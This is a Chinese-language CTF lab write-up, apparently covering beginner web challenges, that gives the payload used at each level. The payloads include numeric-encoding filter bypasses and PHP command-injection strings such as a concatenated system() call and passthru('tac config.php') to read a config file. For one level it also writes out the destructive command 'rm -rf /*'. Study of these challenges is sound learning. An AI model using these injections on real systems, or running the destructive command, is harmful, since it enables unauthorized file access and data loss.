## 2022-3-13 萌新区
### web1
![image](https://user-images.githubusercontent.com/44671805/158057441-fe61a684-2db2-496e-800a-a77adb9b486f.png)
- 点进靶场看了一下源代码，大致意思说可以接受get传参，flag在id=1000的传参界面，但是代码里会判断id的值,如果直接输入1000则会触发id>999，引发错误。
一开始没有思路，看了下别人的WP，说可以使用十六进制，将1000转成16进制试了一下果然可以了
也可以先传一个id=100再加 or id=1000
![image](https://user-images.githubusercontent.com/44671805/158057557-78eca79c-b16a-46fc-a8d8-dad0e8cb546f.png)

### web2
![image](https://user-images.githubusercontent.com/44671805/158057903-7e06112f-17ef-40d0-9a67-4a765f4306e6.png)
可以看出第二关过滤了or，但是可以利用取反~，两次取反还是1000
![image](https://user-images.githubusercontent.com/44671805/158057961-862fbdc2-c24d-4d0d-9249-b46077d1f32b.png)

### web3
第三关同样没有过滤~，和第二关一样
![image](https://user-images.githubusercontent.com/44671805/158058098-a5d3b603-5266-4fe6-be6c-953099c72b2d.png)

### web4
第四关同理

### web5
第五关同理

### web6
第六关同理

### web7
第七关过滤了很多，但是可以将1000转成二进制，?id=0b1111101000
![image](https://user-images.githubusercontent.com/44671805/158058404-b57c6e12-8380-4427-a513-575bb5679956.png)

### web8
不太懂...大佬们是怎么把这个和这个梗联系起来的 ?flag=rm -rf /*

## 2022-3-17
### web9
![image](https://user-images.githubusercontent.com/44671805/158771656-a3675348-bfd5-4bf1-aa89-cce81d785ddc.png)
?c=highlight_file('config.php');
![image](https://user-images.githubusercontent.com/44671805/158772860-48863ad4-dcbb-4e38-ad12-a1fb184176a5.png)

### web10
可以看出，web10代码里说传参不能包含这几个函数
![image](https://user-images.githubusercontent.com/44671805/158773620-58f548b9-0b2c-45db-abc3-b1373f8e0503.png)
?c=$a='sys';$b='tem';$d=$a.$b;$d('cat config.php');
也可以用passthru代码绕过
?c=passthru('tac config.php');
passthru和system基本相同
![image](https://user-images.githubusercontent.com/44671805/158776734-f0f52c75-0919-41c5-9794-5a9eed0c035f.png)
![image](https://user-images.githubusercontent.com/44671805/158777498-42d5aaaf-5d45-4af9-abd4-866a2479ec88.png)



